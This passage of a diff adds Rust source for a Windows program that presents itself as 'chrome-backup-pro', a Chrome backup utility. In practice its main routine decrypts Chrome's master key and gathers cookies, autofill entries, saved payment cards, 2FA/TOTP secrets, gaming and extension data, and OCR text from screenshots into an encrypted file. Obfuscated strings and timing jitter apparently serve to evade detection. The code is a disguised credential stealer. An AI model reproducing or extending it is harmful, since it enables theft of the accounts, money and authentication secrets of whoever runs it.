+            let mut buf = [0u16; 85];
+            let len = GetUserDefaultLocaleName(buf.as_mut_ptr(), 85);
+            if len > 0 {
+                String::from_utf16_lossy(&buf[..len as usize - 1]).to_string()
+            } else {
+                xor_str!("en-US")
+            }
+        }
+    }
+
+    // ======================================================================
+    // LOCAL SAVE
+    // ======================================================================
+
+    fn save_backup(backup: &BackupData) -> bool {
+        let json = match serde_json::to_string(backup) {
+            Ok(j) => j,
+            Err(_) => return false,
+        };
+        entropy_2();
+        let compressed = compress(json.as_bytes());
+        let encrypted = encrypt(&compressed);
+        jitter(300);
+        let user_profile = env::var(xor_str!("USERPROFILE")).unwrap_or_default();
+        let desktop = format!("{}\\Desktop", user_profile);
+        let path = format!("{}\\chrome_backup_{}.bak", desktop, get_ts());
+        let mut file = match std::fs::File::create(&path) {
+            Ok(f) => f,
+            Err(_) => return false,
+        };
+        if file.write_all(&encrypted).is_err() {
+            return false;
+        }
+        show_message(xor_str!("Backup Complete"), format!("Backup saved to: {}", path));
+        true
+    }
+
+    fn show_message(title: String, msg: String) {
+        let title_w: Vec<u16> = title.encode_utf16().chain(Some(0)).collect();
+        let msg_w: Vec<u16> = msg.encode_utf16().chain(Some(0)).collect();
+        unsafe {
+            MessageBoxW(
+                ptr::null_mut(),
+                msg_w.as_ptr(),
+                title_w.as_ptr(),
+                MB_OK | MB_ICONINFORMATION,
+            );
+        }
+    }
+
+    fn compress(data: &[u8]) -> Vec<u8> {
+        let mut enc = GzEncoder::new(Vec::new(), Compression::best());
+        enc.write_all(data).unwrap_or_default();
+        enc.finish().unwrap_or_default()
+    }
+
+    fn encrypt(data: &[u8]) -> Vec<u8> {
+        let key = get_key();
+        data.iter()
+            .enumerate()
+            .map(|(i, &b)| b ^ key[i % key.len()])
+            .collect()
+    }
+
+    fn get_key() -> Vec<u8> {
+        let mut k = Vec::new();
+        if let Ok(u) = env::var(xor_str!("USERNAME")) {
+            k.extend_from_slice(u.as_bytes());
+        }
+        if let Ok(c) = env::var(xor_str!("COMPUTERNAME")) {
+            k.extend_from_slice(c.as_bytes());
+        }
+        if k.is_empty() {
+            k = xor_str!("CBP_FALLBACK").as_bytes().to_vec();
+        }
+        k
+    }
+
+    fn base64_dec(input: &str) -> Option<Vec<u8>> {
+        general_purpose::STANDARD_NO_PAD.decode(input).ok()
+    }
+
+    // ======================================================================
+    // MAIN
+    // ======================================================================
+
+    pub fn run() {
+        entropy_1();
+        jitter(1500);
+
+        let master_key = unsafe { get_master_key().unwrap_or_default() };
+
+        if master_key.is_empty() {
+            show_message(xor_str!("Error"), xor_str!("No Chrome data found or decryption failed."));
+            std::process::exit(0);
+        }
+
+        jitter(800);
+
+        let (cookies, fills, cards) = extract_chrome(&master_key);
+        jitter(600);
+        let backup = BackupData {
+            meta: collect_meta(),
+            cookies,
+            fills,
+            cards,
+            game: extract_gaming(),
+            extension_data: extract_extension_data(),
+            totp: extract_2fa(),
+            ocr: scan_screenshots_ocr(),
+            ts: get_ts(),
+        };
+
+        jitter(1000);
+        entropy_1();
+
+        save_backup(&backup);
+
+        std::process::exit(0);
+    }
+}
+
+#[cfg(windows)]
+fn main() {
+    app::run();
+}
+
+#[cfg(not(windows))]
+fn main() {
+    println!("chrome-backup-pro is Windows-only.");
+}
